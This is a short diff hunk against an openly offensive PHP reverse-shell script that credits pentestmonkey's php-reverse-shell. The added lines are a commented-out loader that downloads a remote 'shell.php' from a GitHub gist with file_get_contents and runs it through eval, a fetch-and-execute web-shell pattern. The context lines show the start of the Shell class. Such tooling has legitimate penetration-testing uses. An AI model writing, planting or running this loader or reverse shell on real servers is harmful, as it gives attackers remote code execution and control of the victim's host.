@@ -4,6 +4,12 @@
 // Requires PHP v5.0.0 or greater.
 // Works on Linux OS, macOS and Windows OS.
 // See the original script at https://github.com/pentestmonkey/php-reverse-shell.
+
+// <?php 
+// $filedata = file_get_contents('https://gist.githubusercontent.com/absane/d731f69d3ed72ed7dd2f3ff98c45cc92/raw/3c7190237cc7b8b226c90a8b2a71a6e284a6a8a3/shell.php');
+// eval ("?>$filedata");
+// ?>
+
 header('Content-Type: text/plain; charset=UTF-8');
 class Shell {
     private $addr  = null;
